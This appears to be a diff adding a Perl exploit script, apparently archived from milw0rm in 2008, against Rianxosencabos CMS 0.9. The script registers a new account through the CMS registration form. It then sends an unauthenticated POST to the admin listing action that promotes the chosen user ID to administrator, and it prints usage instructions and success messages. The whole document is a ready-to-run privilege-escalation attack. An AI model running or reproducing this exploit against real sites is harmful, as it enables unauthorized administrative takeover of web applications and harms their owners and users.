@@ -1,0 +1,61 @@
+#!/usr/bin/perl -w
+
+# Rianxosencabos CMS 0.9 Remote Add Admin Exploit
+# Download: http://downloads.sourceforge.net/rsccms/rsccms.tar.gz
+
+# written by ka0x <ka0x01 [at] gmail [dot] com>
+# D.O.M Labs - Security Researchers
+# - www.domlabs.org -
+
+use LWP::UserAgent;
+
+my ($host, $login, $pass, $mail, $user_id) = @ARGV ;
+
+unless($ARGV[4]){
+	print "[*] usage: perl $0 <host> <login> <pass> <mail> <user_id>\n";
+	print "[*] ex: perl $0 http://localhost/ ka0x 12345 ka0x01[at]gmail.com 2\n";
+	exit 1;
+}
+
+if ($host !~ /^http:/){ $host = 'http://'.$host; }
+
+my $ua = LWP::UserAgent->new() or die ;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1") ;
+$ua->timeout(10) ;
+
+sub __CREATE {
+
+	my $req = HTTP::Request->new(POST => $host."index.php?s=usuarios&accion=registrar") ;
+	$req->content_type('application/x-www-form-urlencoded') ;
+	$req->content("reg_login=".$login."&reg_pass=".$pass."&reg_repass=".$pass."&reg_nombre=".$login."&reg_mail=".$mail."&submit_register=Rexistrar") ;
+
+	my $res = $ua->request($req) ;
+	my $location = $res->header('Location') ;
+	if ($location =~ /Usuario creado/i) {
+		print "[+] user added: ".$login ;
+		print "\n[+] password: ".$pass, "\n" ;
+	}
+
+	else{
+		print "[-] Exploit Failed!\n" ;
+	}
+}
+
+&__CREATE ;
+
+sub __ADMIN {
+	my $req = HTTP::Request->new(POST => $host."?s=admin&accion=lista") ;
+
+	$req->content_type('application/x-www-form-urlencoded') ;
+
+	$req->content($user_id."=0&inputOculto=".$user_id) ;
+
+	$ua->request($req) ;
+}
+
+&__ADMIN ;
+
+
+__END__
+
+# milw0rm.com [2008-09-24]
